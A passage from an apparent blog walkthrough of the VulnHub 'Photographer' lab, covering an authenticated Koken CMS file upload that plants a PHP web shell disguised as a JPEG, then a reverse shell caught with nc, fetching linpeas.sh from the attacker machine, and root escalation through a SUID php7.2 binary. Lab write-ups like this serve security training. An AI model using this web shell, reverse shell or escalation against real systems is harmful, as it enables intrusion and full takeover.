+Cookie: <span class="nv">koken_session_ci</span><span class="o">=</span>u1YR5VZ8znra9LIUkLILlGecmHce75FKV5DWXBbk7uYYqfgn3SfP%2Fv%2F%2BlcvdflHe%2F68Nu9NLLMMU%2B1%2Fotwnv90r%2BlfToAK%2BQoG8SQNPUvfy8nm7kpSypm9caLceaSjszFBWwEYsxMCYj1TtOz4VtIK50XSQatWYQ5t4WcvnqsjdQLn0woHnn0m8P2Hj0gQTeD4hEZb3pFwPV%2BY1vrsNnMDnA3VxGaVwO9HRyPLg5lOdfIbyVeGOInZPlnAMiUychWMUoGyFYTuwH2fOrLygXzyEyTaCLpskaWRBek6KLNrf2P9n368BIsd47RE5fdsSauyb4%2FEHrTazlrT9S7qQ1UjXMlWcmxXpBfbb4KMbqjULQZyjukALxaOyWPuFTPGv%2F9ZMHXeiUycfNvgA9nbDRJrQgURy5F9jx%2FdgFhctZoi4Al%2B9GRZWOip3vP%2BiRM4ZHQkCH2iZfMY2JkDAFR8cTQbqj4NYs3eEO5KMMHkyTDy3S9qFIFbd7olPOoOumelKw%2Fbq8G4A1osKMvZNsnzPPXwtd8E5aPQqFbB2oVUi4pXgrlFcXgB2jDyh3pWO7cd7z13I3uWOk3Anc4dCKqZvF7o7ChUbh8bPX7oyKA2k8NvpkjVMt%2BQBRdbMrDP8Et3OM%2FmFR4cksEVxv3m9cai8XFvytgpRKKcyqGa%2FzKo16OFLdlZFMWZuXLtCcsadOq2aK1%2BHgFbY%2BFhJas8PLy%2BIvFVKDeoTbYSRL83wc6UJg0aaI%2BD5sj9FC3pIe9OpqPFGlgPOdiVhXYenGpkAJwRUl5xVBJJff8rNkXkPdX6zKMfFxv9eppydOkRLc5ON%2Bw5AE2M12zraTlGLcfVmywe9m6TEEo31KrJq8iXH39XojBnGvnTB6W6ZixhYvYVEy6OVhhqT49PKTqnxH3wOdn%2Fi7gRsIZkTwv9LPBdl%2BzdkVuT3LnUqGTU5m8bMgWM0sI8slhcCESCMy4sRMMYATv9XPNaNVzmRpXgO%2FJze%2FNMk9M5y4RePiaOT0svglmLBbuus3wSHWkZRZMwHpC2Hp7HtF5F7DdwVs7E4nCmW5GcjLRQbG%2BKd%2B6lEZ2u96NafGk%2BXufakMz5qv52ulSWUCdMYGGl49L0oRGG8oGrHmJ2WOO%2B%2B9w8ch2a5z3h1sndkBs760zYgv1Ptwfu4refz5ol6OyufqwwAIipAogoEA9ayNw9RkC1PUSbuSdG%2FT7mbCvf9078zSM2Gyua6JUVlNFItSq6VfArs57oHnN8K%2FCCP0S6gmYrnISL2PYcau8O%2FCSjZTmDLjgFiAnzU4WKs6%2FAmxjzayQSRtQLiw9dT744GrwvV2gwc1VeO4FPpiq59rgy%2BY4152d83683f8449982019921a126c94440322d38
+Connection: keep-alive
+
+<span class="nt">------WebKitFormBoundarydjT9BT6fKT3BUBDZ</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"name"</span>
+
+image.php
+<span class="nt">------WebKitFormBoundarydjT9BT6fKT3BUBDZ</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"chunk"</span>
+
+0
+<span class="nt">------WebKitFormBoundarydjT9BT6fKT3BUBDZ</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"chunks"</span>
+
+1
+<span class="nt">------WebKitFormBoundarydjT9BT6fKT3BUBDZ</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"upload_session_start"</span>
+
+1738324309
+<span class="nt">------WebKitFormBoundarydjT9BT6fKT3BUBDZ</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"visibility"</span>
+
+public
+<span class="nt">------WebKitFormBoundarydjT9BT6fKT3BUBDZ</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"license"</span>
+
+all
+<span class="nt">------WebKitFormBoundarydjT9BT6fKT3BUBDZ</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"max_download"</span>
+
+none
+<span class="nt">------WebKitFormBoundarydjT9BT6fKT3BUBDZ</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"file"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">"image.php"</span>
+Content-Type: image/jpeg
+
+&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>?&gt;
+
+<span class="nt">------WebKitFormBoundarydjT9BT6fKT3BUBDZ--</span>
+</code></pre></div></div> <p><br> Forward the request on to upload our malicious php file.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/forward.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Forward Request" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Watch the traffic that comes through the interceptor. Note the location of our php file.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/traffic.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Watch Traffic" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Test the path from the traffic with id for the cmd parameter to test command execution.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.0.0.15:8000/storage/originals/7d/17/image.php?cmd<span class="o">=</span><span class="nb">id</span>
+</code></pre></div></div> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/id.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Command Execution" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Start a listener.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                         
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div> <p><br> Use Revshells to generate a Python3 payload.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.revshells.com/
+</code></pre></div></div> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/revshells.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Revshells" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use the python3 payload from revshells and paste in into the cmd parameter. Execute it. Check the listener and catch the shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                         
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.0.0.14] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.0.15] 41394
+<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+www-data@photographer:/var/www/html/koken/storage/originals/7d/17<span class="err">$</span>
+</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>user.txt
+&lt;redacted&gt;
+www-data@photographer:/home/daisa<span class="nv">$ </span>ip a
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 08:00:27:2f:84:a3 brd ff:ff:ff:ff:ff:ff
+    inet 10.0.0.15/24 brd 10.0.0.255 scope global dynamic enp0s3
+       valid_lft 589sec preferred_lft 589sec
+    inet6 fe80::6c05:5fdd:681b:cd25/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> Copy linpeas.sh into the local working folder and start a python web server to serve the script.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph]
+└─<span class="nv">$ </span><span class="nb">cp</span> <span class="sb">`</span>locate linpeas.sh<span class="sb">`</span> <span class="nb">.</span>                                                            
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/vulnhub/photograph]
+└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server               
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</code></pre></div></div> <p><br> Transfer the results to the victim machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/dev/shm<span class="nv">$ </span>wget 10.0.0.14:8000/linpeas.sh
+wget 10.0.0.14:8000/linpeas.sh
+<span class="nt">--2025-01-31</span> 07:22:25--  http://10.0.0.14:8000/linpeas.sh
+Connecting to 10.0.0.14:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 839766 <span class="o">(</span>820K<span class="o">)</span> <span class="o">[</span>text/x-sh]
+Saving to: <span class="s1">'linpeas.sh'</span>
+
+linpeas.sh          100%[<span class="o">===================&gt;]</span> 820.08K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.002s  
+
+2025-01-31 07:22:25 <span class="o">(</span>410 MB/s<span class="o">)</span> - <span class="s1">'linpeas.sh'</span> saved <span class="o">[</span>839766/839766]
+
+www-data@photographer:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x linpeas.sh
+<span class="nb">chmod</span> +x linpeas.shs
+</code></pre></div></div> <p><br> Run linpeas and review the results. Notice that the php binary has the sticky bit.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/dev/shm<span class="nv">$ </span>./linpeas.sh
+./linpeas.sh
+
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+&lt;snip&gt;
+
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                          
+                      ╚════════════════════════════════════╝                                                                                                                                                                                
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
+<span class="nt">-rwsr-xr--</span> 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                   
+<span class="nt">-rwsr-xr-x</span> 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+<span class="nt">-rwsr-sr-x</span> 1 root root 11K Oct 25  2018 /usr/lib/xorg/Xorg.wrap
+<span class="nt">-rwsr-xr-x</span> 1 root root 109K Jul 10  2020 /usr/lib/snapd/snap-confine  <span class="nt">---</span><span class="o">&gt;</span>  Ubuntu_snapd&lt;2.37_dirty_sock_Local_Privilege_Escalation<span class="o">(</span>CVE-2019-7304<span class="o">)</span>
+<span class="nt">-rwsr-xr-x</span> 1 root root 419K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+<span class="nt">-rwsr-xr-x</span> 1 root root 19K Mar 18  2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+<span class="nt">-rwsr-xr-x</span> 1 root root 15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+<span class="nt">-rwsr-xr--</span> 1 root dip 386K Feb 11  2020 /usr/sbin/pppd  <span class="nt">---</span><span class="o">&gt;</span>  Apple_Mac_OSX_10.4.8<span class="o">(</span>05-2007<span class="o">)</span>
+<span class="nt">-rwsr-xr-x</span> 1 root root 23K Mar 27  2019 /usr/bin/pkexec  <span class="nt">---</span><span class="o">&gt;</span>  Linux4.10_to_5.1.17<span class="o">(</span>CVE-2019-13272<span class="o">)</span>/rhel_6<span class="o">(</span>CVE-2011-1485<span class="o">)</span>/Generic_CVE-2021-4034
+<span class="nt">-rwsr-xr-x</span> 1 root root 53K May 16  2017 /usr/bin/passwd  <span class="nt">---</span><span class="o">&gt;</span>  Apple_Mac_OSX<span class="o">(</span>03-2006<span class="o">)</span>/Solaris_8/9<span class="o">(</span>12-2004<span class="o">)</span>/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1<span class="o">(</span>02-1997<span class="o">)</span>
+<span class="nt">-rwsr-xr-x</span> 1 root root 39K May 16  2017 /usr/bin/newgrp  <span class="nt">---</span><span class="o">&gt;</span>  HP-UX_10.20
+<span class="nt">-rwsr-xr-x</span> 1 root root 74K May 16  2017 /usr/bin/gpasswd
+<span class="nt">-rwsr-xr-x</span> 1 root root 4.7M Jul  9  2020 /usr/bin/php7.2 <span class="o">(</span>Unknown SUID binary!<span class="o">)</span>
+<span class="nt">-rwsr-xr-x</span> 1 root root 134K Jan 31  2020 /usr/bin/sudo  <span class="nt">---</span><span class="o">&gt;</span>  check_if_the_sudo_version_is_vulnerable
+<span class="nt">-rwsr-xr-x</span> 1 root root 40K May 16  2017 /usr/bin/chsh
+<span class="nt">-rwsr-xr-x</span> 1 root root 49K May 16  2017 /usr/bin/chfn  <span class="nt">---</span><span class="o">&gt;</span>  SuSE_9.3/10
+<span class="nt">-rwsr-xr-x</span> 1 root root 44K May  7  2014 /bin/ping
+<span class="nt">-rwsr-xr-x</span> 1 root root 31K Jul 12  2016 /bin/fusermount
+<span class="nt">-rwsr-xr-x</span> 1 root root 40K May 16  2018 /bin/mount  <span class="nt">---</span><span class="o">&gt;</span>  Apple_Mac_OSX<span class="o">(</span>Lion<span class="o">)</span>_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+<span class="nt">-rwsr-xr-x</span> 1 root root 44K May  7  2014 /bin/ping6
+<span class="nt">-rwsr-xr-x</span> 1 root root 27K May 16  2018 /bin/umount  <span class="nt">---</span><span class="o">&gt;</span>  BSD/Linux<span class="o">(</span>08-1996<span class="o">)</span>
+<span class="nt">-rwsr-xr-x</span> 1 root root 40K May 16  2017 /bin/su
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Check the GTFOBins for a potential SUID privelege escalation.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://gtfobins.github.io/gtfobins/php/
+</code></pre></div></div> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/photographer/gtfo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="GTFOBins" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use the php binary to escalate your privilege.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/dev/shm<span class="nv">$ </span>/usr/bin/php7.2 <span class="nt">-r</span> <span class="s2">"pcntl_exec('/bin/sh', ['-p']);"</span>
+&lt;shm<span class="nv">$ </span>/usr/bin/php7.2 <span class="nt">-r</span> <span class="s2">"pcntl_exec('/bin/sh', ['-p']);"</span>                    
+<span class="c"># whoami</span>
+<span class="nb">whoami
+</span>root
+</code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat proof.txt</span>
+<span class="nb">cat </span>proof.txt
+
+&lt;snip&gt;
+
+&lt;redacted&gt;
+<span class="c"># ip a</span>
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 08:00:27:2f:84:a3 brd ff:ff:ff:ff:ff:ff
+    inet 10.0.0.15/24 brd 10.0.0.255 scope global dynamic enp0s3
+       valid_lft 585sec preferred_lft 585sec
+    inet6 fe80::6c05:5fdd:681b:cd25/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> And with that we finished up another one.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
